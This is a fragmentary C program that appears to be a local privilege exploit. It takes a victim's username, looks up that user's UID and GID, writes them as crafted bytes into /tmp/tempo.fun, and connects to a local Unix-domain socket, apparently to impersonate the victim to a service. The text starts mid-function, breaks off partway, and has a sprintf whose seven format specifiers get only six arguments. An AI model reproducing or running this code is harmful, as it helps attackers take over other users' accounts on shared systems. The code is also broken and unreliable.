```
fwrite(tempo,1,taille+4,param); }
```

```
main(int argc,char** argv) {  struct sockaddr_un sin,expediteur;  struct hostent  *hp;  struct passwd *info;  int chaussete,taille_expediteur,port,taille_struct,taille_param;
char buffer[TAILLE_BUFFER],paramz[TAILLE_BUFFER],*disp,*pointeur;
FILE *param;

char *HOME,*LOGIN;
int UID,GID;

printf("\n\n%s\n\n",KOPY);
if (argc!=2) {  printf("%s\n",NOUSER); exit(1); }
```

```
info=getpwnam(argv[1]);
if (!info)     {  printf("%s\n",UNKNOWN);
exit(1);  }

HOME=info->pw_dir;
LOGIN=info->pw_name;
UID=info->pw_uid;
GID=info->pw_gid;

param=fopen("/tmp/tempo.fun","wb");

chaussete=socket(AF_UNIX,SOCK_STREAM,0);  sin.sun_family=AF_UNIX;  strcpy(sin.sun_path,SOCK_PATH);
taille_struct=sizeof(struct sockaddr_un);
```

```
if (connect(chaussete,(struct sockaddr*)&sin,taille_struct)<0)
   {
   perror("connect");
   exit(1);  }

   /* 0 0 PF_UID pf_UID 0 0 */
   sprintf(buffer,"%c%c%c%c%c%c%c",0,0,UID>>8,UID- ((UID>>8)*256),0,0);
   fwrite(buffer,1,6,param);
   /* PF_GID pf_GID */
   sprintf(buffer,"%c%c",GID>>8,GID-((GID>>8)*256));
   fwrite(buffer,1,2,param);
```